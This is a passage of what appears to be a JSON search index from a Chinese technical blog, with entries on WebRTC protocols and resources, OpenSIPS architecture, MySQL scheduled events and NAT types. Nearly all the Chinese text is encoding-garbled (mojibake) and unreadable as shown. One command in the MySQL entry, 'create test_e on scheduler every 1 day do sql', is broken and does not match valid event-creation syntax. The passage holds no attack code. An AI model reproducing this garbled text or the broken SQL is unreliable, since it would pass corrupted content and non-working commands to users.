è¾“ï¼‰ Multiplexingï¼ˆå¤šè·¯å¤ç”¨ï¼‰ P2Pï¼ŒSTUN+TURN+ICEï¼ˆç”¨äºNATç½‘ç»œå’Œé˜²ç«å¢™ç©¿è¶Šçš„ï¼‰ é™¤æ­¤ä¹‹å¤–ï¼Œå®‰å…¨ä¼ è¾“å¯èƒ½è¿˜ä¼šç”¨åˆ°DTLSï¼ˆæ•°æ®æŠ¥å®‰å…¨ä¼ è¾“ï¼‰ï¼Œç”¨äºåŠ å¯†ä¼ è¾“å’Œå¯†é’¥åå•† æ•´ä¸ªWebRTCé€šä¿¡æ˜¯åŸºäºUDPçš„ WebRTC å¦‚ä½•é€šä¿¡ getUserMediaç”¨æ¥æ•è·æœ¬åœ°çš„è¯­éŸ³æµæˆ–è€…è§†é¢‘æµ RTCPeerConnectionç”¨æ¥ä»£è¡¨WebRTCé“¾æ¥ï¼Œç”¨æ¥å¤„ç†å¯¹ç­‰å®ä½“ä¹‹é—´çš„æµæ•°æ® RTCDataChannel ç”¨æ¥ä¼ é€’å„ç§æ•°æ® WebRTC çš„æ ¸å¿ƒç»„ä»¶ éŸ³è§†é¢‘å¼•æ“ï¼šOPUSã€VP8 / VP9ã€H264 ä¼ è¾“å±‚åè®®ï¼šåº•å±‚ä¼ è¾“åè®®ä¸º UDP åª’ä½“åè®®ï¼šSRTP / SRTCP æ•°æ®åè®®ï¼šDTLS / SCTP P2P å†…ç½‘ç©¿é€ï¼šSTUN / TURN / ICE / Trickle ICE ä¿¡ä»¤ä¸ SDP åå•†ï¼šHTTP / WebSocket / SIPã€ Offer Answer æ¨¡å‹ WebRTC éŸ³é¢‘å’Œè§†é¢‘å¼•æ“ æœ€åº•å±‚æ˜¯ç¡¬ä»¶è®¾å¤‡ï¼Œä¸Šé¢æ˜¯éŸ³é¢‘æ•è·æ¨¡å—å’Œè§†é¢‘æ•è·æ¨¡å— ä¸­é—´éƒ¨åˆ†ä¸ºéŸ³è§†é¢‘å¼•æ“ã€‚éŸ³é¢‘å¼•æ“è´Ÿè´£éŸ³é¢‘é‡‡é›†å’Œä¼ è¾“ï¼Œå…·æœ‰é™å™ªã€å›å£°æ¶ˆé™¤ç­‰åŠŸèƒ½ã€‚è§†é¢‘å¼•æ“è´Ÿè´£ç½‘ç»œæŠ–åŠ¨ä¼˜åŒ–ï¼Œäº’è”ç½‘ä¼ è¾“ç¼–è§£ç ä¼˜åŒ– åœ¨éŸ³è§†é¢‘å¼•æ“ä¹‹ä¸Šæ˜¯ ä¸€å¥— C++ APIï¼Œåœ¨ C++ çš„ API ä¹‹ä¸Šæ˜¯æä¾›ç»™æµè§ˆå™¨çš„Javascript API WebRTC åº•å±‚åè®® WebRTC æ ¸å¿ƒçš„åè®®éƒ½æ˜¯åœ¨å³ä¾§åŸºäº UDP åŸºç¡€ä¸Šæ­å»ºèµ·æ¥çš„ å…¶ä¸­ï¼ŒICEã€STUNã€TURN ç”¨äºå†…ç½‘ç©¿é€, è§£å†³äº†è·å–ä¸ç»‘å®šå¤–ç½‘æ˜ å°„åœ°å€ï¼Œä»¥åŠ keep alive æœºåˆ¶ DTLS ç”¨äºå¯¹ä¼ è¾“å†…å®¹è¿›è¡ŒåŠ å¯†ï¼Œå¯ä»¥çœ‹åšæ˜¯ UDP ç‰ˆçš„ TLSã€‚ç”±äº WebRTC å¯¹å®‰å…¨æ¯”è¾ƒé‡è§†ï¼Œè¿™ä¸€å±‚æ˜¯å¿…é¡»çš„ã€‚æ‰€æœ‰WebRTCç»„ä»¶éƒ½å¿…é¡»åŠ å¯†ï¼Œå¹¶ä¸”å…¶JavaScript APIåªèƒ½ç”¨äºå®‰å…¨æºï¼ˆHTTPSæˆ–æœ¬åœ°ä¸»æœºï¼‰ã€‚ä¿¡ä»¤æœºåˆ¶å¹¶ä¸æ˜¯ç”±WebRTCæ ‡å‡†å®šä¹‰çš„ï¼Œæ‰€ä»¥æ‚¨å¿…é¡»ç¡®ä¿ä½¿ç”¨å®‰å…¨åè®®ã€‚ SRTP ä¸ SRTCP æ˜¯å¯¹åª’ä½“æ•°æ®çš„å°è£…ä¸ä¼ è¾“æ§åˆ¶åè®® SCTP æ˜¯æµæ§åˆ¶ä¼ è¾“åè®®ï¼Œæä¾›ç±»ä¼¼ TCP çš„ç‰¹æ€§ï¼ŒSCTP å¯ä»¥åŸºäº UDP ä¸Šæ„å»ºï¼Œåœ¨ WebRTC é‡Œæ˜¯åœ¨ DTLS åè®®ä¹‹ä¸Š RTCPeerConnection ç”¨æ¥å»ºç«‹å’Œç»´æŠ¤ç«¯åˆ°ç«¯è¿æ¥ï¼Œå¹¶æä¾›é«˜æ•ˆçš„éŸ³è§†é¢‘æµä¼ è¾“ RTCDataChannel ç”¨æ¥æ”¯æŒç«¯åˆ°ç«¯çš„ä»»æ„äºŒè¿›åˆ¶æ•°æ®ä¼ è¾“ WebRTC åè®®æ ˆè§£é‡Š ICEï¼šäº’åŠ¨å¼è¿æ¥å»ºç«‹ï¼ˆRFC 5245ï¼‰ STUNï¼šç”¨äºNATçš„ä¼šè¯éå†å®ç”¨ç¨‹åºï¼ˆRFC 5389ï¼‰ TURNï¼šåœ¨NATå‘¨å›´ä½¿ç”¨ç»§ç”µå™¨è¿›è¡Œéå†ï¼ˆRFC 5766ï¼‰ SDPï¼šä¼šè¯æè¿°åè®®ï¼ˆRFC 4566ï¼‰ DTLSï¼šæ•°æ®æŠ¥ä¼ è¾“å±‚å®‰å…¨æ€§ï¼ˆRFC 6347ï¼‰ SCTPï¼šæµæ§åˆ¶ä¼ è¾“åè®®ï¼ˆRFC 4960ï¼‰ SRTPï¼šå®‰å…¨å®æ—¶ä¼ è¾“åè®®ï¼ˆRFC 3711ï¼‰ æµè§ˆå™¨å’ŒæŸäº›éæµè§ˆå™¨ä¹‹é—´çš„å‘¼å«ï¼Œæœ‰äº›æ—¶å€™ä»¥ä¸ºæ²¡æœ‰DTLSæŒ‡çº¹ï¼Œè€Œå¯¼è‡´å‘¼å«å¤±è´¥ã€‚å¦‚ä¸‹å›¾ä½¿ç”¨JsSIP, ä¸€ä¸ªsipPhoneå’ŒWebRTCä¹‹é—´çš„å‘¼å«ï¼Œå› ä¸ºæ²¡æœ‰æºå¸¦DTLSæŒ‡çº¹è€Œå¯¼è‡´å‘¼å«å¤±è´¥ã€‚","title":"WebRTCç®€ä»‹"},{"content":"ç›®å‰åœ¨åšåŸºäºWebRTCçš„è¯­éŸ³å’Œè§†é¢‘ç»ˆç«¯ï¼Œè¯­éŸ³å’Œè§†é¢‘é€šè¯çš„è´¨é‡éƒ½ä¸é”™ã€‚æ„Ÿè°¢WebRTCï¼Œç«™åœ¨å·¨äººçš„è‚©è†€ä¸Šï¼Œæˆ‘ä»¬å¯ä»¥çœ‹å¾—æ›´è¿œã€‚\nWebRTCæµè§ˆå™¨å…¼å®¹æ€§ github demos ä¸‹é¢ä¸¤ä¸ªéƒ½æ˜¯githubé¡¹ç›®ï¼Œé¡¹ç›®ä¸­æœ‰å„ç§WebRTCçš„demoã€‚é™¤äº†demoä¹‹å¤–ï¼Œè¿™ä¸¤ä¸ªé¡¹ç›®çš„issueseä¹Ÿæ˜¯éå¸¸å€¼å¾—çœ‹çš„ï¼Œå¯ä»¥è§£å†³å¸¸è§çš„é—®é¢˜\nhttps://webrtc.github.io/samples/ https://github.com/muaz-khan/WebRTC-Experiment ç›¸å…³èµ„æ–™ç½‘ç«™ webrtcå®˜ç½‘ï¼š https://webrtc.org/ webrtchacksï¼š https://webrtchacks.com/ webrtcå®˜ç½‘ï¼š https://webrtc.org.cn/ webrtcå®‰å…¨ç›¸å…³ï¼š http://webrtc-security.github.io/ webrtcè°·æ­Œå¼€å‘è€…æ•™ç¨‹ï¼š https://codelabs.developers.google.com/codelabs/webrtc-web/ sdp for webrtc https://tools.ietf.org/id/draft-nandakumar-rtcweb-sdp-01.html å„ç§èµ„æ–™ https://webrtc.org/start/ https://www.w3.org/TR/webrtc/ æµè§ˆå™¨å†…æ ¸ webkitå®˜ç½‘ï¼šhttps://webkit.org/ WebRTCç›¸å…³åº“ webrtc-adapter https://github.com/webrtchacks/adapter WebRTCå‘¨è¾¹jsåº“ åº“ åœ°å€ Addlive http://www.addlive.com/platform-overview/ Apidaze https://developers.apidaze.io/webrtc Bistri http://developers.bistri.com/webrtc-sdk/#js-sdk Crocodile https://www.crocodilertc.net/documentation/javascript/ EasyRTC http://www.easyrtc.com/docs/ Janus http://janus.conf.meetecho.com/docs/JS.html JsSIP http://jssip.net/documentation/ Openclove http://developer.openclove.com/docs/read/ovxjs_api_doc Oracle http://docs.oracle.com/cd/E40972_01/doc.70/e49239/index.html Peerjs http://peerjs.com/docs/#api Phono http://phono.com/docs Plivo https://plivo.com/docs/sdk/web/ Pubnub http://www.pubnub.com/docs/javascript/javascript-sdk.html Quobis https://quobis.atlassian.net/wiki/display/QoffeeSIP/API SimpleWebRTC from \u0026amp;Yet http://simplewebrtc.com/ SIPML5 http://sipml5.org/docgen/symbols/SIPml.html TenHands https://www.tenhands.net/developer/docs.htm TokBox http://tokbox.com/opentok Twilio http://www.twilio.com/client/api Voximplant http://voximplant.com/docs/references/websdk/ Vline https://vline.com/developer/docs/vline.js/ Weemo http://docs.weemo.com/js/ Xirsys http://xirsys.com/_static_content/xirsys.com/docs/ Xsockets.net http://xsockets.net/docs/javascript-client-api VoIP/PSTN https://kamailio.org https://freeswitch.org/ å€¼å¾—å…³æ³¨çš„äºº https://github.com/muaz-khan https://github.com/chadwallacehart https://github.com/fippo WebRTCä¸»é¢˜ githubä¸Šwebrtcä¸»é¢˜ç›¸å…³çš„ä»“åº“ï¼Œå¹²è´§éå¸¸å¤š https://github.com/topics/webrtc\nç›¸å…³æ–‡ç«  guide-to-safari-webrtc WebKit: On the Road to WebRTC 1.0, Including VP8 whats-in-a-webrtc-javascript-library ","permalink":"https://wdd.js.org/opensips/ch9/webrtc-ref/","summary":"ç›®å‰åœ¨åšåŸºäºWebRTCçš„è¯­éŸ³å’Œè§†é¢‘ç»ˆç«¯ï¼Œè¯­éŸ³å’Œè§†é¢‘é€šè¯çš„è´¨é‡éƒ½ä¸é”™ã€‚æ„Ÿè°¢WebRTCï¼Œç«™åœ¨å·¨äººçš„è‚©è†€ä¸Šï¼Œæˆ‘ä»¬å¯ä»¥çœ‹å¾—æ›´è¿œã€‚\nWebRTCæµè§ˆå™¨å…¼å®¹æ€§ github demos ä¸‹é¢ä¸¤ä¸ªéƒ½æ˜¯githubé¡¹ç›®ï¼Œé¡¹ç›®ä¸­æœ‰å„ç§WebRTCçš„demoã€‚é™¤äº†demoä¹‹å¤–ï¼Œè¿™ä¸¤ä¸ªé¡¹ç›®çš„issueseä¹Ÿæ˜¯éå¸¸å€¼å¾—çœ‹çš„ï¼Œå¯ä»¥è§£å†³å¸¸è§çš„é—®é¢˜\nhttps://webrtc.github.io/samples/ https://github.com/muaz-khan/WebRTC-Experiment ç›¸å…³èµ„æ–™ç½‘ç«™ webrtcå®˜ç½‘ï¼š https://webrtc.org/ webrtchacksï¼š https://webrtchacks.com/ webrtcå®˜ç½‘ï¼š https://webrtc.org.cn/ webrtcå®‰å…¨ç›¸å…³ï¼š http://webrtc-security.github.io/ webrtcè°·æ­Œå¼€å‘è€…æ•™ç¨‹ï¼š https://codelabs.developers.google.com/codelabs/webrtc-web/ sdp for webrtc https://tools.ietf.org/id/draft-nandakumar-rtcweb-sdp-01.html å„ç§èµ„æ–™ https://webrtc.org/start/ https://www.w3.org/TR/webrtc/ æµè§ˆå™¨å†…æ ¸ webkitå®˜ç½‘ï¼šhttps://webkit.org/ WebRTCç›¸å…³åº“ webrtc-adapter https://github.com/webrtchacks/adapter WebRTCå‘¨è¾¹jsåº“ åº“ åœ°å€ Addlive http://www.addlive.com/platform-overview/ Apidaze https://developers.apidaze.io/webrtc Bistri http://developers.bistri.com/webrtc-sdk/#js-sdk Crocodile https://www.crocodilertc.net/documentation/javascript/ EasyRTC http://www.easyrtc.com/docs/ Janus http://janus.conf.meetecho.com/docs/JS.html JsSIP http://jssip.net/documentation/ Openclove http://developer.openclove.com/docs/read/ovxjs_api_doc Oracle http://docs.oracle.com/cd/E40972_01/doc.70/e49239/index.html Peerjs http://peerjs.com/docs/#api Phono http://phono.com/docs Plivo https://plivo.com/docs/sdk/web/ Pubnub http://www.pubnub.com/docs/javascript/javascript-sdk.html Quobis https://quobis.atlassian.net/wiki/display/QoffeeSIP/API SimpleWebRTC from \u0026amp;Yet http://simplewebrtc.com/ SIPML5 http://sipml5.org/docgen/symbols/SIPml.html TenHands https://www.tenhands.net/developer/docs.htm TokBox http://tokbox.","title":"WebRTCå­¦ä¹ èµ„æ–™åˆ†äº«"},{"content":"1. OpenSIPSæ¶æ„ OpenSIPSä¸»è¦æœ‰ä¸¤éƒ¨åˆ†æ„æˆï¼Œ\ncore: æä¾›åº•å±‚å·¥å…·ã€æ¥å£ã€èµ„æº moduleï¼šæ¨¡å—æ˜¯ä¸€äº›å…±äº«çš„åº“ï¼Œåœ¨å¯åŠ¨æ—¶æŒ‰éœ€åŠ è½½ã€‚æœ‰äº›æ¨¡å—æ˜¯ç”¨äºåœ¨opensipsè„šæœ¬ä¸­æä¾›åŠŸèƒ½ï¼Œè€Œæœ‰äº›æ¨¡å—æ˜¯ä½œä¸ºåº•å±‚ï¼Œä¸ºå…¶ä»–æ¨¡å—æä¾›åŠŸèƒ½ã€‚ 2. OpenSIP æ ¸å¿ƒ 2.1. ä¼ è¾“å±‚ ä¼ è¾“å±‚æä¾›äº†å¯¹äºå„ç§åè®®çš„æ”¯æŒï¼Œå¦‚TCPã€UDPã€TLSã€WebSocket\n2.2. SIPå·¥å‚å±‚ SIPå·¥å‚å±‚æä¾›äº†å¯¹SIPåè®®çš„è§£æå’Œæ„å»ºã€‚OpenSIPSå®ç°äº†ä¸€ç§æ‡’è§£æåŠŸèƒ½ï¼Œæ‡’è§£æçš„æ•ˆç‡éå¸¸é«˜ã€‚\næ‡’è§£æï¼šæ‡’è§£æå°±æ˜¯åªå»è§£æSIPå¤´ï¼Œå¹¶ä¸è§£æSIPå¤´çš„å­—æ®µå†…å®¹ã€‚è€Œæ˜¯åœ¨éœ€è¦è¯»å–å¤´å­—æ®µå†…å®¹æ—¶ï¼Œæ‰å»è§£æã€‚æ‰€ä»¥å¯ä»¥ç†è§£ä¸ºæŒ‰éœ€è§£æã€‚æœ‰ç‚¹ç±»ä¼¼äºä¸€äº›æ–‡ä»¶ç³»ç»Ÿçš„å†™æ—¶å¤åˆ¶åŠŸèƒ½ã€‚\n**æƒ°æ€§åº”ç”¨ï¼š**æœ‰ä¸€ç‚¹éå¸¸é‡è¦ï¼Œå½“ä½ é€šè¿‡è„šæœ¬æä¾›çš„å‡½æ•°å»æ”¹å˜SIPæ¶ˆæ¯æ—¶ï¼Œæ‰€ä½œå‡ºçš„æ”¹å˜å¹¶ä¸æ˜¯å®æ—¶ä½œç”¨åˆ°SIPæ¶ˆæ¯ä¸Šï¼Œè€Œæ˜¯åœ¨å…ˆå­˜èµ·æ¥ï¼Œè€Œæ˜¯å½“æ‰€æœ‰çš„SIPæ¶ˆæ¯å¤„ç†å®Œæˆåæ‰ä¼šå»åº”ç”¨è¿™äº›æ”¹å˜ã€‚ä¸¾ä¾‹æ¥è¯´ï¼Œä½ é¦–å…ˆé€šè¿‡å‡½æ•°ç»™SIPæ¶ˆæ¯æ·»åŠ äº†æŸä¸ªå¤´ï¼Œç„¶åä½ é€šè¿‡å‡½æ•°å»è·å–è¿™ä¸ªå¤´çš„æ—¶ï¼Œå‘ç°è¿™ä¸ªå¤´å¹¶ä¸å­˜åœ¨ï¼Œä½†æ˜¯SIPæ¶ˆæ¯å†å‘é€å‡ºå»åï¼Œåˆæºå¸¦äº†ä½ æ·»åŠ çš„è¿™ä¸ªå¤´ã€‚\n2.3. è·¯ç”±è„šæœ¬è§£æä¸æ‰§è¡Œ OpenSIPSåœ¨å¯åŠ¨åï¼Œä¼šå°†opensips.cfgè§£æå¹¶åŠ è½½åˆ°å†…å­˜ä¸­ã€‚ä¸€æ—¦OpenSIPSæ­£å¸¸è¿è¡Œäº†ï¼Œopensips.cfgæ–‡ä»¶å³ä½¿åˆ äº†ä¹Ÿä¸ä¼šå½±å“åˆ°OpenSIPSçš„è¿è¡Œäº†ã€‚\nä½†æ˜¯OpenSIPSå¹¶ä¸æ”¯æŒçƒ­è„šæœ¬æ›´æ–°ï¼Œå¦‚æœä½ æ”¹äº†è„šæœ¬ï¼Œè®©è®©è¿è¡Œçš„OpenSIPSå…·æœ‰æ·»åŠ çš„åŠŸèƒ½ï¼Œé‚£ä¹ˆå¿…é¡»å°†OpensSIPSé‡å¯ã€‚\nOpenSIPSçš„è„šæœ¬æœ‰ç‚¹ç±»ä¼¼äºCæˆ–è€…Shellè¯­è¨€ï¼Œå¦‚æœä½ Shellå†™çš„å¾ˆæºœï¼ŒOpenSIPSçš„è„šæœ¬ç†è§£èµ·æ¥ä¹Ÿä¼šéå¸¸å®¹æ˜“ã€‚\n2.4. å†…å­˜ä¸é”ç®¡ç† å‡ºäºæ€§èƒ½è€ƒè™‘ï¼ŒOpenSIPSè‡ªå·±å†…éƒ¨å®ç°äº†å†…å­˜å’Œé”çš„ç®¡ç†ï¼Œè¿™éƒ¨åˆ†åœ¨å†…å®¹åœ¨è„šæœ¬ä¸­æ˜¯ä¸å¯è§çš„ã€‚\n2.5. è„šæœ¬å˜é‡å’Œè„šæœ¬å‡½æ•° OpenSIPSæ ¸å¿ƒæä¾›çš„è„šæœ¬å˜é‡å’Œå‡½æ•°æ¯”è¾ƒæœ‰é™ï¼Œå¤–å›´çš„æ¨¡å—æä¾›å’Œå¾ˆå¤šçš„å˜é‡å’Œå‡½æ•°ã€‚è¿™äº›å˜é‡å’Œå‡½æ•°çš„å­˜åœ¨ï¼Œéƒ½æ˜¯ä¸ºäº†è®©ä½ æ˜“äºè·å–SIPæ¶ˆæ¯çš„æŸäº›å­—æ®µï¼Œæˆ–è€…å¯¹SIPæ¶ˆæ¯è¿›è¡Œä¿®æ”¹ã€‚\n2.6. SQLæ¥å£ç±» OpenSIPS æ ¸å¿ƒå®ç°äº†æ¥å£çš„å®šä¹‰ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰å®ç°æ¥å£ã€‚æ¥å£çš„å®ç°ç”±å¤–éƒ¨çš„æ¨¡å—æä¾›ï¼Œè¿™æ ·åšçš„å‡½æ•°å¯ä»¥ä½¿ç”¨ä¸åŒçš„æ•°æ®åº“ã€‚\n2.7. MIç®¡ç†æ¥å£ miæ¥å£ç”¨æ¥ç®¡ç†OpenSIPS, å¯ä»¥å®ç°ä»¥ä¸‹åŠŸèƒ½\nå‘OpenSIPS å‘é€æ•°æ® ä»OpenSIPS è·å–æ•°æ® è§¦å‘OpenSIPS çš„å†…éƒ¨è¡Œä¸º ","permalink":"https://wdd.js.org/opensips/ch3/about-opensips/","summary":"1. OpenSIPSæ¶æ„ OpenSIPSä¸»è¦æœ‰ä¸¤éƒ¨åˆ†æ„æˆï¼Œ\ncore: æä¾›åº•å±‚å·¥å…·ã€æ¥å£ã€èµ„æº moduleï¼šæ¨¡å—æ˜¯ä¸€äº›å…±äº«çš„åº“ï¼Œåœ¨å¯åŠ¨æ—¶æŒ‰éœ€åŠ è½½ã€‚æœ‰äº›æ¨¡å—æ˜¯ç”¨äºåœ¨opensipsè„šæœ¬ä¸­æä¾›åŠŸèƒ½ï¼Œè€Œæœ‰äº›æ¨¡å—æ˜¯ä½œä¸ºåº•å±‚ï¼Œä¸ºå…¶ä»–æ¨¡å—æä¾›åŠŸèƒ½ã€‚ 2. OpenSIP æ ¸å¿ƒ 2.1. ä¼ è¾“å±‚ ä¼ è¾“å±‚æä¾›äº†å¯¹äºå„ç§åè®®çš„æ”¯æŒï¼Œå¦‚TCPã€UDPã€TLSã€WebSocket\n2.2. SIPå·¥å‚å±‚ SIPå·¥å‚å±‚æä¾›äº†å¯¹SIPåè®®çš„è§£æå’Œæ„å»ºã€‚OpenSIPSå®ç°äº†ä¸€ç§æ‡’è§£æåŠŸèƒ½ï¼Œæ‡’è§£æçš„æ•ˆç‡éå¸¸é«˜ã€‚\næ‡’è§£æï¼šæ‡’è§£æå°±æ˜¯åªå»è§£æSIPå¤´ï¼Œå¹¶ä¸è§£æSIPå¤´çš„å­—æ®µå†…å®¹ã€‚è€Œæ˜¯åœ¨éœ€è¦è¯»å–å¤´å­—æ®µå†…å®¹æ—¶ï¼Œæ‰å»è§£æã€‚æ‰€ä»¥å¯ä»¥ç†è§£ä¸ºæŒ‰éœ€è§£æã€‚æœ‰ç‚¹ç±»ä¼¼äºä¸€äº›æ–‡ä»¶ç³»ç»Ÿçš„å†™æ—¶å¤åˆ¶åŠŸèƒ½ã€‚\n**æƒ°æ€§åº”ç”¨ï¼š**æœ‰ä¸€ç‚¹éå¸¸é‡è¦ï¼Œå½“ä½ é€šè¿‡è„šæœ¬æä¾›çš„å‡½æ•°å»æ”¹å˜SIPæ¶ˆæ¯æ—¶ï¼Œæ‰€ä½œå‡ºçš„æ”¹å˜å¹¶ä¸æ˜¯å®æ—¶ä½œç”¨åˆ°SIPæ¶ˆæ¯ä¸Šï¼Œè€Œæ˜¯åœ¨å…ˆå­˜èµ·æ¥ï¼Œè€Œæ˜¯å½“æ‰€æœ‰çš„SIPæ¶ˆæ¯å¤„ç†å®Œæˆåæ‰ä¼šå»åº”ç”¨è¿™äº›æ”¹å˜ã€‚ä¸¾ä¾‹æ¥è¯´ï¼Œä½ é¦–å…ˆé€šè¿‡å‡½æ•°ç»™SIPæ¶ˆæ¯æ·»åŠ äº†æŸä¸ªå¤´ï¼Œç„¶åä½ é€šè¿‡å‡½æ•°å»è·å–è¿™ä¸ªå¤´çš„æ—¶ï¼Œå‘ç°è¿™ä¸ªå¤´å¹¶ä¸å­˜åœ¨ï¼Œä½†æ˜¯SIPæ¶ˆæ¯å†å‘é€å‡ºå»åï¼Œåˆæºå¸¦äº†ä½ æ·»åŠ çš„è¿™ä¸ªå¤´ã€‚\n2.3. è·¯ç”±è„šæœ¬è§£æä¸æ‰§è¡Œ OpenSIPSåœ¨å¯åŠ¨åï¼Œä¼šå°†opensips.cfgè§£æå¹¶åŠ è½½åˆ°å†…å­˜ä¸­ã€‚ä¸€æ—¦OpenSIPSæ­£å¸¸è¿è¡Œäº†ï¼Œopensips.cfgæ–‡ä»¶å³ä½¿åˆ äº†ä¹Ÿä¸ä¼šå½±å“åˆ°OpenSIPSçš„è¿è¡Œäº†ã€‚\nä½†æ˜¯OpenSIPSå¹¶ä¸æ”¯æŒçƒ­è„šæœ¬æ›´æ–°ï¼Œå¦‚æœä½ æ”¹äº†è„šæœ¬ï¼Œè®©è®©è¿è¡Œçš„OpenSIPSå…·æœ‰æ·»åŠ çš„åŠŸèƒ½ï¼Œé‚£ä¹ˆå¿…é¡»å°†OpensSIPSé‡å¯ã€‚\nOpenSIPSçš„è„šæœ¬æœ‰ç‚¹ç±»ä¼¼äºCæˆ–è€…Shellè¯­è¨€ï¼Œå¦‚æœä½ Shellå†™çš„å¾ˆæºœï¼ŒOpenSIPSçš„è„šæœ¬ç†è§£èµ·æ¥ä¹Ÿä¼šéå¸¸å®¹æ˜“ã€‚\n2.4. å†…å­˜ä¸é”ç®¡ç† å‡ºäºæ€§èƒ½è€ƒè™‘ï¼ŒOpenSIPSè‡ªå·±å†…éƒ¨å®ç°äº†å†…å­˜å’Œé”çš„ç®¡ç†ï¼Œè¿™éƒ¨åˆ†åœ¨å†…å®¹åœ¨è„šæœ¬ä¸­æ˜¯ä¸å¯è§çš„ã€‚\n2.5. è„šæœ¬å˜é‡å’Œè„šæœ¬å‡½æ•° OpenSIPSæ ¸å¿ƒæä¾›çš„è„šæœ¬å˜é‡å’Œå‡½æ•°æ¯”è¾ƒæœ‰é™ï¼Œå¤–å›´çš„æ¨¡å—æä¾›å’Œå¾ˆå¤šçš„å˜é‡å’Œå‡½æ•°ã€‚è¿™äº›å˜é‡å’Œå‡½æ•°çš„å­˜åœ¨ï¼Œéƒ½æ˜¯ä¸ºäº†è®©ä½ æ˜“äºè·å–SIPæ¶ˆæ¯çš„æŸäº›å­—æ®µï¼Œæˆ–è€…å¯¹SIPæ¶ˆæ¯è¿›è¡Œä¿®æ”¹ã€‚\n2.6. SQLæ¥å£ç±» OpenSIPS æ ¸å¿ƒå®ç°äº†æ¥å£çš„å®šä¹‰ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰å®ç°æ¥å£ã€‚æ¥å£çš„å®ç°ç”±å¤–éƒ¨çš„æ¨¡å—æä¾›ï¼Œè¿™æ ·åšçš„å‡½æ•°å¯ä»¥ä½¿ç”¨ä¸åŒçš„æ•°æ®åº“ã€‚\n2.7. MIç®¡ç†æ¥å£ miæ¥å£ç”¨æ¥ç®¡ç†OpenSIPS, å¯ä»¥å®ç°ä»¥ä¸‹åŠŸèƒ½\nå‘OpenSIPS å‘é€æ•°æ® ä»OpenSIPS è·å–æ•°æ® è§¦å‘OpenSIPS çš„å†…éƒ¨è¡Œä¸º ","title":"opensipsä»‹ç»"},{"content":"ä»MySql5.1.6å¢åŠ è®¡åˆ’ä»»åŠ¡åŠŸèƒ½\nåˆ¤æ–­è®¡åˆ’ä»»åŠ¡æ˜¯å¦å¯åŠ¨ SHOW VARIABLES LIKE \u0026#39;event_scheduler\u0026#39; å¼€å¯è®¡åˆ’ä»»åŠ¡ set global event_scheduler=on åˆ›å»ºè®¡åˆ’ä»»åŠ¡ create test_e on scheduler every 1 day do sql ä¿®æ”¹è®¡åˆ’ä»»åŠ¡ #Â ä¸´æ—¶å…³é—­äº‹ä»¶ ALTER EVENT e_test DISABLE; #Â å¼€å¯äº‹ä»¶ ALTER EVENT e_test ENABLE; #Â å°†æ¯å¤©æ¸…ç©ºtestè¡¨æ”¹ä¸º5å¤©æ¸…ç©ºä¸€æ¬¡ ALTER EVENT e_testÂ ON SCHEDULE EVERY 5 DAY; åˆ é™¤è®¡åˆ’ä»»åŠ¡ drop event e_test ","permalink":"https://wdd.js.org/posts/2019/11/xss1vk/","summary":"ä»MySql5.1.6å¢åŠ è®¡åˆ’ä»»åŠ¡åŠŸèƒ½\nåˆ¤æ–­è®¡åˆ’ä»»åŠ¡æ˜¯å¦å¯åŠ¨ SHOW VARIABLES LIKE \u0026#39;event_scheduler\u0026#39; å¼€å¯è®¡åˆ’ä»»åŠ¡ set global event_scheduler=on åˆ›å»ºè®¡åˆ’ä»»åŠ¡ create test_e on scheduler every 1 day do sql ä¿®æ”¹è®¡åˆ’ä»»åŠ¡ #Â ä¸´æ—¶å…³é—­äº‹ä»¶ ALTER EVENT e_test DISABLE; #Â å¼€å¯äº‹ä»¶ ALTER EVENT e_test ENABLE; #Â å°†æ¯å¤©æ¸…ç©ºtestè¡¨æ”¹ä¸º5å¤©æ¸…ç©ºä¸€æ¬¡ ALTER EVENT e_testÂ ON SCHEDULE EVERY 5 DAY; åˆ é™¤è®¡åˆ’ä»»åŠ¡ drop event e_test ","title":"Mysqlè®¡åˆ’ä»»åŠ¡ï¼šEvent Scheduler"},{"content":" NATçš„äº§ç”ŸåŸå› æ˜¯IPv4çš„åœ°å€ä¸å¤Ÿç”¨ï¼Œç½‘ç»œä¸­çš„éƒ¨åˆ†ä¸»æœºåªèƒ½å…¬ç”¨ä¸€ä¸ªå¤–ç½‘IPã€‚ NATå·¥ä½œåœ¨ç½‘ç»œå±‚å’Œä¼ è¾“å±‚ï¼Œä¸»è¦æ˜¯å¯¹IPåœ°å€å’Œç«¯å£å·çš„æ”¹å˜ NATçš„ä¼˜ç‚¹ èŠ‚çº¦å…¬ç½‘IP å®‰å…¨æ€§æ›´å¥½ï¼Œæ‰€æœ‰æµé‡éƒ½éœ€è¦ç»è¿‡å…¥å£çš„é˜²ç«å¢™ NATçš„ç¼ºç‚¹ å¯¹äºUPDåº”ç”¨ä¸å¤Ÿå‹å¥½ NAT å·¥ä½œåŸç† å†…éƒ¨çš„è®¾å¤‡X, ç»è¿‡NATè®¾å¤‡åï¼ŒNATè®¾å¤‡ä¼šæ”¹å†™æºIPå’Œç«¯å£ NAT ç±»å‹ 1. å…¨é”¥å‹ æ¯ä¸ªå†…éƒ¨ä¸»æœºéƒ½æœ‰ä¸€ä¸ªé™æ€ç»‘å®šçš„å¤–éƒ¨ip:port ä»»ä½•ä¸»æœºå‘å¾€NATè®¾å¤‡ä¸Šç‰¹å®šip:portçš„åŒ…ï¼Œéƒ½ä¼šè¢«è½¬å‘ç»™ç»‘å®šçš„ä¸»æœº è¿™ç§æ–¹å¼çš„ç¼ºç‚¹å¾ˆæ˜æ˜¾ï¼Œé»‘å®¢å¯ä»¥ä½¿ç”¨ç«¯å£æ‰«æå·¥å…·ï¼Œæ‰«æå‡ºæš´éœ²çš„ç«¯å£ï¼Œç„¶åé€šè¿‡è¿™ä¸ªç«¯å£æ”»å‡»å†…éƒ¨ä¸»æœº åœ¨å†…éƒ¨ä¸»æœºæ²¡æœ‰å¾€å¤–å‘é€æµé‡æ—¶ï¼Œå¤–éƒ¨æµé‡ä¹Ÿèƒ½å¤Ÿè¿›å…¥å†…éƒ¨ä¸»æœº -\n2. é™åˆ¶é”¥å½¢ NATä¸Šçš„ip:portä¸å†…éƒ¨ä¸»æœºæ˜¯åŠ¨æ€ç»‘å®šçš„ å¦‚æœå†…éƒ¨ä¸»æœºæ²¡æœ‰å‘æŸä¸ªä¸»æœºå…ˆå‘é€è¿‡åŒ…ï¼Œé‚£ä¹ˆNATä¼šæ‹’ç»å¤–éƒ¨ä¸»æœºè¿›å…¥çš„æµé‡ 3. ç«¯å£é™åˆ¶å‹ 